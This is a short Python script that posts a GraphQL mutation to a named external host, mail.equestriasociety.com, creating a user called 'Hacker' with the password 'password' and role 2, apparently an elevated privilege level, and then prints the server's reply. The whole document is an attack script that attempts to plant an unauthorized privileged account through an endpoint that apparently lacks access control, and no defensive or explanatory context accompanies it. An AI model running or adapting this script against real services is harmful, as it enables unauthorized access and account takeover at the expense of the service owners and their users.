import requests
import json

url = 'https://mail.equestriasociety.com/graphql'
query = """
mutation {
  createUser(email: "hacker@equestriasociety.com", name: "Hacker", password: "password", role: 2) {
    id
    email
  }
}
"""

response = requests.post(url, json={'query': query})
print(json.dumps(response.json(), indent=2))
